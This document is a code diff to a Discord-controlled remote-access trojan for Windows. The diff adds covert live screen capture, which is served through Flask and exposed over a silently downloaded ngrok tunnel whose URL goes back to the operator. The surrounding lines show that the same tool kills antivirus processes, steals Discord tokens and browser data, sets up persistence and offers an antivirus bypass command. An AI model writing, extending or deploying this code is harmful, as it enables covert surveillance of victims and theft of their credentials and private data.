@@ -19,6 +19,7 @@ import time
 import ctypes
 import webbrowser
 import keyboard
+import threading
 from threading import Thread, Event
 import json
 from datetime import datetime, timedelta, timezone
@@ -47,6 +48,15 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import platform
 import zipfile
 import urllib.request
+import cv2
+import numpy as np
+from flask import Flask, render_template_string, Response
+import threading
+from PIL import Image, ImageGrab
+import io
+
+
+
 
 disable_warnings_urllib3()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -152,6 +162,296 @@ def kill_av_processes():
     except Exception as e:
         logger.error(f"Error killing AV processes: {e}")
         return False
+app = Flask(__name__)
+streamer = None
+flask_thread = None
+ngrok_process = None
+ngrok_url = None
+auth_token = None
+
+CONFIG_FILE = "bot_config.json"
+
+class ScreenStreamer:
+    def __init__(self):
+        self.fps = 10
+        self.quality = 80
+        self.running = False
+        pyautogui.FAILSAFE = False
+        
+    def capture_screen(self):
+        try:
+            try:
+                screenshot = pyautogui.screenshot()
+            except:
+                screenshot = ImageGrab.grab()
+            
+            img = np.array(screenshot)
+            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
+            
+            height, width = img.shape[:2]
+            if width > 1920:
+                new_width = 1920
+                new_height = int(height * (new_width / width))
+                img = cv2.resize(img, (new_width, new_height))
+            
+            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
+            _, buffer = cv2.imencode('.jpg', img, encode_param)
+            
+            return buffer.tobytes()
+            
+        except Exception as e:
+            try:
+                screenshot = ImageGrab.grab()
+                if screenshot.width > 1920:
+                    ratio = 1920 / screenshot.width
+                    new_size = (int(screenshot.width * ratio), int(screenshot.height * ratio))
+                    screenshot = screenshot.resize(new_size, Image.Resampling.LANCZOS)
+                
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format='JPEG', quality=self.quality)
+                return buffer.getvalue()
+            except:
+                return None
+
+    def generate_frames(self):
+        while self.running:
+            frame = self.capture_screen()
+            if frame:
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+            time.sleep(1.0 / self.fps)
+
+@app.route('/')
+def index():
+    html_template = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Live Screen Stream</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #1a1a1a;
+                color: white;
+                text-align: center;
+            }
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+            .stream-container {
+                margin: 20px 0;
+                border: 2px solid #333;
+                border-radius: 8px;
+                overflow: hidden;
+                background: black;
+            }
+            .stream-video {
+                max-width: 100%;
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+            .status {
+                color: #4CAF50;
+                font-weight: bold;
+                margin: 10px 0;
+            }
+            h1 {
+                color: #4CAF50;
+                margin-bottom: 30px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Live Screen Stream</h1>
+            <div class="status">LIVE - Screen streaming active</div>
+            <div class="stream-container">
+                <img src="{{ url_for('video_feed') }}" class="stream-video" alt="Live Screen Stream">
+            </div>
+        </div>
+        <script>
+            let img = document.querySelector('.stream-video');
+            img.onerror = function() {
+                setTimeout(() => location.reload(), 5000);
+            };
+            setInterval(() => {
+                document.title = 'Live Stream - ' + new Date().toLocaleTimeString();
+            }, 1000);
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(html_template)
+
+@app.route('/video_feed')
+def video_feed():
+    global streamer
+    return Response(streamer.generate_frames(),
+                   mimetype='multipart/x-mixed-replace; boundary=frame')
+
+def save_config():
+    config = {"auth_token": auth_token}
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f)
+
+def load_config():
+    global auth_token
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            config = json.load(f)
+            auth_token = config.get("auth_token")
+
+def download_ngrok():
+    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
+    
+    ngrok_dir = os.path.join(os.path.expanduser("~"), ".ngrok_bot")
+    os.makedirs(ngrok_dir, exist_ok=True)
+    ngrok_path = os.path.join(ngrok_dir, "ngrok.exe")
+    
+    if os.path.exists(ngrok_path):
+        return ngrok_path
+    
+    response = requests.get(url)
+    zip_path = os.path.join(ngrok_dir, "ngrok.zip")
+    
+    with open(zip_path, 'wb') as f:
+        f.write(response.content)
+    
+    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+        zip_ref.extractall(ngrok_dir)
+    
+    os.remove(zip_path)
+    return ngrok_path
+
+def setup_ngrok_auth(ngrok_path):
+    if auth_token:
+        subprocess.run([ngrok_path, "config", "add-authtoken", auth_token], 
+                      capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+def start_ngrok(ngrok_path):
+    global ngrok_process, ngrok_url
+    
+    setup_ngrok_auth(ngrok_path)
+    
+    ngrok_process = subprocess.Popen([ngrok_path, "http", "5000", "--log=stdout"], 
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                                   text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    
+    for line in iter(ngrok_process.stdout.readline, ''):
+        if "url=" in line and "https://" in line:
+            url_start = line.find("https://")
+            url_end = line.find(" ", url_start)
+            if url_end == -1:
+                url_end = len(line)
+            ngrok_url = line[url_start:url_end].strip()
+            break
+    
+    return ngrok_url
+
+def start_flask():
+    global streamer
+    streamer = ScreenStreamer()
+    streamer.running = True
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
+
+def stop_services():
+    global streamer, flask_thread, ngrok_process, ngrok_url
+    
+    if streamer:
+        streamer.running = False
+    
+    if ngrok_process:
+        ngrok_process.terminate()
+        ngrok_process = None
+    
+    ngrok_url = None
+
+@bot.event
+async def on_ready():
+    load_config()
+    print(f'Bot logged in as {bot.user}')
+
+@bot.command()
+async def key(ctx, token: str = None):
+    global auth_token
+    
+    if token is None:
+        await ctx.send("Usage: !key <your_ngrok_auth_token>")
+        return
+    
+    auth_token = token
+    save_config()
+    await ctx.send("Auth token saved successfully!")
+
+@bot.command()
+async def live(ctx):
+    global flask_thread, ngrok_url
+    
+    if flask_thread and flask_thread.is_alive():
+        await ctx.send("Stream is already running!")
+        return
+    
+    await ctx.send("Starting screen stream... Please wait...")
+    
+    try:
+        ngrok_path = download_ngrok()
+        
+        flask_thread = threading.Thread(target=start_flask, daemon=True)
+        flask_thread.start()
+        
+        await asyncio.sleep(3)
+        
+        loop = asyncio.get_event_loop()
+        ngrok_url = await loop.run_in_executor(None, start_ngrok, ngrok_path)
+        
+        if ngrok_url:
+            embed = discord.Embed(
+                title="Screen Stream Active",
+                description=f"Your screen is now live at:\n{ngrok_url}",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send("Failed to start ngrok tunnel. Make sure you set your auth token with !key")
+    
+    except Exception as e:
+        await ctx.send(f"Error starting stream: {str(e)}")
+
+@bot.command()
+async def stop(ctx):
+    global flask_thread
+    
+    if not flask_thread or not flask_thread.is_alive():
+        await ctx.send("No stream is currently running.")
+        return
+    
+    stop_services()
+    await ctx.send("Stream stopped successfully!")
+
+@bot.command()
+async def status(ctx):
+    global flask_thread, ngrok_url
+    
+    if flask_thread and flask_thread.is_alive() and ngrok_url:
+        embed = discord.Embed(
+            title="Stream Status: ACTIVE",
+            description=f"Live URL: {ngrok_url}",
+            color=0x00ff00
+        )
+    else:
+        embed = discord.Embed(
+            title="Stream Status: INACTIVE",
+            description="Use !live to start streaming",
+            color=0xff0000
+        )
+    
+    await ctx.send(embed=embed)
 
 class DiscordTokenStealer:
     @staticmethod
@@ -718,6 +1018,9 @@ async def help(ctx):
 !recent [browser] - Browser history
 !discord - Extract Discord tokens
 !browsers - Extract browser data
+!live - Start screen streaming (you need to set !key first)
+!stop - Stop the stream
+!status - Check if stream is running
 
 **Other:**
 !msg <message> - Show message box
@@ -727,6 +1030,7 @@ async def help(ctx):
 !su - Request admin privileges
 !avbypass - Bypass antivirus
 !persist - Add persistence
+!key <your_ngrok_auth_token> - Set your ngrok auth token (get from ngrok.com, easy and free)
 
 {watermark()}
 """
